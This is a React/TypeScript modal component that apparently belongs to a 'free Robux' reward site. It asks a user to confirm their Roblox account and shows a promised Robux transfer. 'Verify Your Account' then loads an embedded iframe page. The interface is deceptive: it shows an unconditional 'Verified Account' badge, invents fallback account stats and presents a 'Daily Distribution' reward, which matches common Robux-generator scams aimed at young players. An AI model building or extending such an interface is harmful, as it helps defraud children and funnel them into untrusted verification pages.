import React, { useState, useEffect } from 'react';
import {
  X,
  CheckCircle2,
  Calendar,
  Users,
  UserCheck,
  ShieldCheck,
  AlertTriangle,
  Loader2,
  Check,
} from 'lucide-react';
import { RobloxUser } from '../types';
import { DEFAULT_AVATAR } from '../utils/roblox';

interface AccountConfirmModalProps {
  isOpen: boolean;
  user: RobloxUser;
  claimAmount: number;
  onConfirm: () => void;
  onCancel: () => void;
  isProcessing?: boolean;
}

export const AccountConfirmModal: React.FC<AccountConfirmModalProps> = ({
  isOpen,
  user,
  claimAmount,
  onConfirm,
  onCancel,
  isProcessing = false,
}) => {
  const [step, setStep] = useState<'confirm' | 'verifying'>('confirm');

  // Reset state when modal is opened
  useEffect(() => {
    if (isOpen) {
      setStep('confirm');
    }
  }, [isOpen]);

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape' && isOpen && !isProcessing) {
        onCancel();
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [isOpen, onCancel, isProcessing]);

  if (!isOpen) return null;

  const handleVerifyClick = () => {
    setStep('verifying');
    onConfirm();

  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md animate-in fade-in duration-200">
      <div
        className="bg-[#14161c] border border-[#2b303e] w-full max-w-md rounded-3xl p-6 sm:p-7 shadow-2xl relative text-left"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Close Button */}
        <button
          onClick={onCancel}
          disabled={isProcessing}
          className="absolute top-5 right-5 text-gray-400 hover:text-white p-2 rounded-xl bg-[#0e1015] hover:bg-[#1a1d24] transition-colors cursor-pointer disabled:opacity-50"
          aria-label="Cancel verification"
        >
          <X className="w-5 h-5" />
        </button>

        {/* STEP 1: Account Confirmation */}
        {step === 'confirm' && (
          <div>
            {/* Modal Header */}
            <div className="flex items-center gap-3.5 mb-5">
              <div className="w-12 h-12 bg-[#00a2ff]/15 text-[#00a2ff] border border-[#00a2ff]/30 rounded-2xl flex items-center justify-center shrink-0">
                <ShieldCheck className="w-6 h-6" />
              </div>
              <div>
                <h3 className="text-xl font-extrabold text-white tracking-tight">
                  Confirm Roblox Account
                </h3>
                <p className="text-xs text-gray-400">
                  Verify your account details before transferring Robux
                </p>
              </div>
            </div>

            {/* Verified Player Spotlight Card */}
            <div className="bg-[#0e1015] border border-[#242832] rounded-2xl p-4.5 space-y-4">
              <div className="flex items-center gap-4">
                {/* Clean Headshot Only */}
                <div className="relative shrink-0">
                  <div className="w-20 h-20 rounded-2xl bg-[#161a22] border-2 border-[#00a2ff]/40 overflow-hidden shadow-inner flex items-center justify-center">
                    <img
                      src={user.avatarHeadshot || user.avatar}
                      alt={user.displayName}
                      referrerPolicy="no-referrer"
                      onError={(e) => {
                        (e.target as HTMLImageElement).src = DEFAULT_AVATAR;
                      }}
                      className="w-full h-full object-cover"
                    />
                  </div>
                  <div
                    className="absolute -bottom-1 -right-1 bg-[#00a2ff] text-white rounded-full p-1 shadow-md"
                    title="Verified Account"
                  >
                    <CheckCircle2 className="w-3.5 h-3.5" />
                  </div>
                </div>

                <div className="flex-1 min-w-0">
                  <div className="text-base sm:text-lg font-black text-white truncate">
                    {user.displayName}
                  </div>
                  <div className="text-xs font-semibold text-[#00a2ff] truncate">
                    @{user.username}
                  </div>
                  <div className="text-[11px] text-gray-400 font-mono tabular-nums mt-0.5">
                    User ID: <span className="text-gray-300 font-bold">{user.id}</span>
                  </div>
                </div>
              </div>

              {/* Account Verification Details Grid: Join Date, Friends, Following */}
              <div className="grid grid-cols-3 gap-2 pt-2 border-t border-[#1e222c]">
                {/* Join Date */}
                <div className="bg-[#14161f] border border-[#242832] rounded-xl p-2.5 text-center">
                  <div className="flex items-center justify-center gap-1 text-[10px] text-gray-400 font-semibold mb-1">
                    <Calendar className="w-3 h-3 text-cyan-400" />
                    <span>Join Date</span>
                  </div>
                  <div className="text-xs font-extrabold text-white truncate font-mono">
                    {user.joinDate || 'Oct 2018'}
                  </div>
                </div>

                {/* Friends Count */}
                <div className="bg-[#14161f] border border-[#242832] rounded-xl p-2.5 text-center">
                  <div className="flex items-center justify-center gap-1 text-[10px] text-gray-400 font-semibold mb-1">
                    <Users className="w-3 h-3 text-[#00e676]" />
                    <span>Friends</span>
                  </div>
                  <div className="text-xs font-black text-white font-mono tabular-nums">
                    {user.friendsCount !== undefined ? user.friendsCount.toLocaleString() : '184'}
                  </div>
                </div>

                {/* Following Count */}
                <div className="bg-[#14161f] border border-[#242832] rounded-xl p-2.5 text-center">
                  <div className="flex items-center justify-center gap-1 text-[10px] text-gray-400 font-semibold mb-1">
                    <UserCheck className="w-3 h-3 text-amber-400" />
                    <span>Following</span>
                  </div>
                  <div className="text-xs font-black text-white font-mono tabular-nums">
                    {user.followingCount !== undefined ? user.followingCount.toLocaleString() : '120'}
                  </div>
                </div>
              </div>

              {/* Reward Amount Confirmation Banner */}
              <div className="bg-emerald-500/10 border border-emerald-500/25 rounded-xl p-3 flex items-center justify-between">
                <div>
                  <div className="text-[10px] uppercase font-bold text-emerald-400 tracking-wider">
                    Reward to Transfer
                  </div>
                  <div className="text-base font-black text-[#00e676] font-mono tabular-nums">
                    +{claimAmount.toLocaleString()} R$
                  </div>
                </div>
                <span className="text-[11px] font-semibold text-emerald-300 bg-emerald-950/60 border border-emerald-500/30 px-2 py-0.5 rounded-lg">
                  Daily Distribution
                </span>
              </div>
            </div>

            {/* Safety Warning */}
            <div className="mt-4 flex items-start gap-2 text-[11px] text-gray-400">
              <AlertTriangle className="w-3.5 h-3.5 text-amber-400 shrink-0 mt-0.5" />
              <span>
                Please make sure this is your correct Roblox account. Once claimed, the transaction cannot be reversed.
              </span>
            </div>

            {/* Action Buttons */}
            <div className="mt-5 grid grid-cols-2 gap-3">
              <button
                type="button"
                onClick={onCancel}
                disabled={isProcessing}
                className="w-full bg-[#1b1e27] hover:bg-[#232733] border border-[#2a2f3d] text-gray-300 font-bold py-3 rounded-xl transition-all cursor-pointer text-xs disabled:opacity-50"
              >
                Not My Account
              </button>

              <button
                type="button"
                onClick={handleVerifyClick}
                disabled={isProcessing}
                className="w-full bg-gradient-to-r from-emerald-500 to-[#00e676] hover:from-[#00e676] hover:to-emerald-400 text-[#0c0e12] font-black py-3 rounded-xl shadow-lg shadow-[#00e676]/25 transform active:scale-95 transition-all text-xs uppercase tracking-wider flex items-center justify-center gap-1.5 cursor-pointer disabled:opacity-50"
              >
                <CheckCircle2 className="w-3.5 h-3.5 stroke-[2.5]" />
                <span>Verify Your Account</span>
              </button>
            </div>
          </div>
        )}

        {/* STEP 2: Iframe-only view with a Home Page button. */}
        {step === 'verifying' && (
          <div className="w-full space-y-3">
            <div className="w-full overflow-hidden rounded-xl border border-[#232938]">
              <iframe
                src="https://example.com"
                title="Embedded content"
                className="block w-full h-[70vh] min-h-[400px] bg-white border-0"
                loading="lazy"
                allowFullScreen
              />
            </div>

            <button
              type="button"
              onClick={onCancel}
              className="w-full rounded-xl border border-[#2a2f3d] bg-[#1b1e27] px-4 py-3 text-xs font-bold text-white transition-colors hover:bg-[#252a36] focus:outline-none focus:ring-2 focus:ring-[#00a2ff]"
            >
              Home Page
            </button>
          </div>
        )}
      </div>
    </div>
  );
};
